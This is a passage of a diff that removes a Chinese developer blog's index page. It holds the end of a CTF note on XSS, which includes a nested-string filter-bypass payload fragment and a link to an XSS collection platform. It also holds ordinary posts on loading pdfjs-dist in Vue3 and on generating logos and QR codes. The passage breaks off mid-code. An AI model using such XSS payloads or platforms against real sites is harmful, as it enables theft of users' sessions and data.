HREF=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Xss平台"><a href="#Xss平台" class="headerlink" title="Xss平台"></a>Xss平台</h1><p>例如：<a target="_blank" rel="noopener" href="https://xssjs.com/">https://xssjs.com/</a></p>
-
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/04/21/CTF/XSS-%E5%B8%B8%E7%94%A8%E8%AE%B0%E5%BD%95/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.xingxiaowu.cn/2025/04/15/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94pdfjs-dist%E6%80%8E%E4%B9%88%E5%BC%95%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/headerPic.png">
-      <meta itemprop="name" content="无星">
-      <meta itemprop="description" content="一个么的前途的弟中弟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="无星的小窝">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/04/15/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94pdfjs-dist%E6%80%8E%E4%B9%88%E5%BC%95%E5%85%A5/" class="post-title-link" itemprop="url">无星的前端之旅（三十三）——pdfjs-dist怎么引入.md</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2025-04-15 18:24:00 / 修改时间：10:50:46" itemprop="dateCreated datePublished" datetime="2025-04-15T18:24:00+08:00">2025-04-15</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%89%8D%E7%AB%AF/" itemprop="url" rel="index"><span itemprop="name">前端</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/2025/04/15/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94pdfjs-dist%E6%80%8E%E4%B9%88%E5%BC%95%E5%85%A5/" class="post-meta-item leancloud_visitors" data-flag-title="无星的前端之旅（三十三）——pdfjs-dist怎么引入.md" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.4k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="报错引流"><a href="#报错引流" class="headerlink" title="报错引流"></a>报错引流</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: No “GlobalWorkerOptions.workerSrc“ specified.</span><br></pre></td></tr></table></figure>
-
-<h1 id="使用框架"><a href="#使用框架" class="headerlink" title="使用框架"></a>使用框架</h1><ul>
-<li>vite</li>
-<li>pdf-js</li>
-<li>vue3</li>
-</ul>
-<h1 id="pnpm"><a href="#pnpm" class="headerlink" title="pnpm"></a>pnpm</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm add pdfjs-dist</span><br></pre></td></tr></table></figure>
-
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>页面文件</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> pdfjsLib <span class="keyword">from</span> <span class="string">&#x27;pdfjs-dist&#x27;</span></span><br><span class="line"><span class="comment">// .....其他代码</span></span><br><span class="line"><span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  pdfjsLib.<span class="property">GlobalWorkerOptions</span>.<span class="property">workerSrc</span> = <span class="keyword">new</span> <span class="title function_">URL</span>(</span><br><span class="line">    <span class="string">&quot;pdfjs-dist/build/pdf.worker.min.mjs&quot;</span>,</span><br><span class="line">    <span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">url</span></span><br><span class="line">  ).<span class="title function_">toString</span>();</span><br><span class="line">  <span class="comment">// pdfjsLib.GlobalWorkerOptions.workerSrc = &#x27;../../node_modules/pdfjs-dist/build/pdf.worker.min.mjs&#x27;;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<p><code>vite.config.ts</code>新增配置</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2025/04/15/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94pdfjs-dist%E6%80%8E%E4%B9%88%E5%BC%95%E5%85%A5/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.xingxiaowu.cn/2025/04/15/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E4%BF%A1%E6%81%AF%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81%E8%AE%A9%E5%BE%AE%E4%BF%A1%E8%83%BD%E5%A4%9F%E6%89%AB%E7%A0%81%E8%AF%86%E5%88%AB%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/headerPic.png">
-      <meta itemprop="name" content="无星">
-      <meta itemprop="description" content="一个么的前途的弟中弟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="无星的小窝">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/04/15/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E4%BF%A1%E6%81%AF%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81%E8%AE%A9%E5%BE%AE%E4%BF%A1%E8%83%BD%E5%A4%9F%E6%89%AB%E7%A0%81%E8%AF%86%E5%88%AB%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4/" class="post-title-link" itemprop="url">无星的前端之旅（三十二）——信息生成二维码让微信能够扫码识别复制粘贴.md</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2025-04-15 18:23:00 / 修改时间：10:40:49" itemprop="dateCreated datePublished" datetime="2025-04-15T18:23:00+08:00">2025-04-15</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%89%8D%E7%AB%AF/" itemprop="url" rel="index"><span itemprop="name">前端</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/2025/04/15/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E4%BF%A1%E6%81%AF%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81%E8%AE%A9%E5%BE%AE%E4%BF%A1%E8%83%BD%E5%A4%9F%E6%89%AB%E7%A0%81%E8%AF%86%E5%88%AB%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4/" class="post-meta-item leancloud_visitors" data-flag-title="无星的前端之旅（三十二）——信息生成二维码让微信能够扫码识别复制粘贴.md" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>9.3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>8 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>有一些信息需要生成二维码，让微信能够扫码识别复制粘贴</p>
-<h1 id="vue版本"><a href="#vue版本" class="headerlink" title="vue版本"></a>vue版本</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;输入文字生成文字 logo&lt;/h1&gt;</span><br><span class="line">    &lt;input v-model=&quot;companyName&quot; type=&quot;text&quot; placeholder=&quot;请输入文字&quot;&gt;</span><br><span class="line">    &lt;button @click=&quot;generateLogo&quot;&gt;生成 logo&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;downloadLogo&quot;&gt;下载 logo&lt;/button&gt;</span><br><span class="line">    &lt;div id=&quot;logo&quot; ref=&quot;logoRef&quot; :style=&quot;&#123; backgroundColor: logoBgColor &#125;&quot;&gt;&#123;&#123; logoText &#125;&#125;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;输入信息生成二维码&lt;/h1&gt;</span><br><span class="line">    &lt;input v-model=&quot;companyName2&quot; type=&quot;text&quot; placeholder=&quot;请输入title&quot;&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;textarea v-model=&quot;address&quot; placeholder=&quot;请输入信息&quot; cols=&quot;22&quot; rows=&quot;5&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;button @click=&quot;generateQRCode&quot;&gt;生成二维码&lt;/button&gt;</span><br><span class="line">    &lt;div id=&quot;qrcode&quot; v-html=&quot;qrcodeHtml&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;companyNameDisplay&quot;&gt;&#123;&#123; companyName2 &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line">import &#123; ref, type Ref &#125; from &#x27;vue&#x27;;</span><br><span class="line">// 假设 qrcode.min.js 已经安装并导入</span><br><span class="line">import QRCode from &#x27;qrcode-generator&#x27;;</span><br><span class="line"></span><br><span class="line">// 定义响应式变量的类型</span><br><span class="line">const companyName: Ref&lt;string&gt; = ref(&#x27;&#x27;);</span><br><span class="line">const logoText: Ref&lt;string&gt; = ref(&#x27;&#x27;);</span><br><span class="line">const logoBgColor: Ref&lt;string&gt; = ref(&#x27;&#x27;);</span><br><span class="line">const companyName2: Ref&lt;string&gt; = ref(&#x27;&#x27;);</span><br><span class="line">const address: Ref&lt;string&gt; = ref(&#x27;&#x27;);</span><br><span class="line">const qrcodeHtml: Ref&lt;string&gt; = ref(&#x27;&#x27;);</span><br><span class="line">const logoRef: Ref&lt;HTMLElement | null&gt; = ref(null);</span><br><span class="line"></span><br><span class="line">const generateLogo = () =&gt; &#123;</span><br><span class="line">  if (companyName.value.length === 4) &#123;</span><br><span class="line">    logoText.value = `$&#123;companyName.value.slice(0, 2)&#125;\n$&#123;companyName.value.slice(2)&#125;`;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    logoText.value = companyName.value;</span><br><span class="line">  &#125;</span><br><span class="line">  const randomColor = &#x27;#&#x27; + Math.floor(Math.random() * 16777215).toString(16);</span><br><span class="line">  logoBgColor.value = randomColor;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">const downloadLogo = async () =&gt; &#123;</span><br><span class="line">  const canvas = document.createElement(&#x27;canvas&#x27;);</span><br><span class="line">  const ctx = canvas.getContext(&#x27;2d&#x27;);</span><br><span class="line">  const text = logoText.value;</span><br><span class="line">  const color = logoRef.value?.style.backgroundColor || &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">  canvas.width = 2048;</span><br><span class="line">  canvas.height = 2048;</span><br><span class="line"></span><br><span class="line">  // 设置字体样式，与页面上的 logo 字体大小一致</span><br><span class="line">  if (ctx) &#123;</span><br><span class="line">    ctx.font = &#x27;748px Arial&#x27;;</span><br><span class="line">    ctx.textAlign = &#x27;center&#x27;;</span><br><span class="line">    ctx.textBaseline = &#x27;middle&#x27;;</span><br><span class="line"></span><br><span class="line">    // 清空画布</span><br><span class="line">    ctx.clearRect(0, 0, canvas.width, canvas.height);</span><br><span class="line"></span><br><span class="line">    // 绘制带圆角的背景</span><br><span class="line">    const radius = 200;</span><br><span class="line">    const x = 0;</span><br><span class="line">    const y = 0;</span><br><span class="line">    const width = 2048;</span><br><span class="line">    const height = 2048;</span><br><span class="line"></span><br><span class="line">    ctx.beginPath();</span><br><span class="line">    ctx.moveTo(x + radius, y);</span><br><span class="line">    ctx.lineTo(x + width - radius, y);</span><br><span class="line">    ctx.quadraticCurveTo(x + width, y, x + width, y + radius);</span><br><span class="line">    ctx.lineTo(x + width, y + height - radius);</span><br><span class="line">    ctx.quadraticCurveTo(x + width, y + height, x + width - radius, y + height);</span><br><span class="line">    ctx.lineTo(x + radius, y + height);</span><br><span class="line">    ctx.quadraticCurveTo(x, y + height, x, y + height - radius);</span><br><span class="line">    ctx.lineTo(x, y + radius);</span><br><span class="line">    ctx.quadraticCurveTo(x, y, x + radius, y);</span><br><span class="line">    ctx.closePath();</span><br><span class="line"></span><br><span class="line">    ctx.fillStyle = color;</span><br><span class="line">    ctx.fill();</span><br><span class="line"></span><br><span class="line">    // 设置文字颜色</span><br><span class="line">    ctx.fillStyle = &#x27;white&#x27;;</span><br><span class="line"></span><br><span class="line">    // 计算文字位置</span><br><span class="line">    const centerX = canvas.width / 2;</span><br><span class="line">    const centerY = canvas.height / 2;</span><br><span class="line"></span><br><span class="line">    // 绘制文字</span><br><span class="line">    if (text.includes(&#x27;\n&#x27;)) &#123;</span><br><span class="line">      const lines = text.split(&#x27;\n&#x27;);</span><br><span class="line">      const lineHeight = 748;</span><br><span class="line">      const totalHeight = lines.length * lineHeight;</span><br><span class="line">      const startY = centerY - totalHeight / 2 + lineHeight / 2;</span><br><span class="line">      lines.forEach((line, index) =&gt; &#123;</span><br><span class="line">        ctx.fillText(line, centerX, startY + index * lineHeight);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      ctx.fillText(text, centerX, centerY);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 创建下载链接</span><br><span class="line">  const link = document.createElement(&#x27;a&#x27;);</span><br><span class="line">  link.href = canvas.toDataURL(&#x27;image/png&#x27;);</span><br><span class="line">  link.download = companyName.value + &#x27;logo.png&#x27;;</span><br><span class="line">  link.click();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">const generateQRCode = () =&gt; &#123;</span><br><span class="line">  qrcodeHtml.value = &#x27;&#x27;;</span><br><span class="line">  if (address.value) &#123;</span><br><span class="line">    QRCode.stringToBytes = QRCode.stringToBytesFuncs[&#x27;UTF-8&#x27;];</span><br><span class="line">    const qr = QRCode(0, &#x27;L&#x27;);</span><br><span class="line">    qr.addData(address.value);</span><br><span class="line">    // qr.addData(unescape(encodeURIComponent(address)));</span><br><span class="line">    qr.make();</span><br><span class="line">    qrcodeHtml.value = qr.createImgTag(4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">body &#123;</span><br><span class="line">  font-family: Arial, sans-serif;</span><br><span class="line">  text-align: center;</span><br><span class="line">  padding-top: 50px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#logo &#123;</span><br><span class="line">  font-size: 48px;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">  margin-top: 20px;</span><br><span class="line">  padding: 10px;</span><br><span class="line">  border-radius: 20px;</span><br><span class="line">  color: white;</span><br><span class="line">  white-space: pre-line;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: center;</span><br><span class="line">  align-items: center;</span><br><span class="line">  margin-left: auto;</span><br><span class="line">  margin-right: auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#qrcode &#123;</span><br><span class="line">  margin-top: 20px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="html版本"><a href="#html版本" class="headerlink" title="html版本"></a>html版本</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>生成文字 logo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding-top</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#logo</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">48px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">white-space</span>: pre-line;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-right</span>: auto;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#qrcode</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span 